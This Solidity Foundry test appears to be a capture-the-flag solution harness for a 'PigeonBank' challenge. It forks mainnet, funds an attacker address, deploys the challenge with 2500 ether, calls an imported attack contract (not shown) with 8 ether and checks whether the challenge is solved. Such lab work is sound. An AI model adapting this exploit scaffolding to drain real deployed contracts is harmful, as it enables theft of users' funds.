// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./PigeonBankAttack.sol";


contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SetupPigeonBank setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        vm.deal(deployer, 2500 ether);
        vm.deal(attacker, 10 ether);
        setup = new SetupPigeonBank{value: 2500 ether}();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console2.log("isSolved: ", setup.isSolved());
        vm.stopPrank();

    }

    function solve() public {
        PigeonBankAttack pba = new PigeonBankAttack();
        pba.attack{value: 8 ether}(address(setup.pigeonBank()));
    }

}


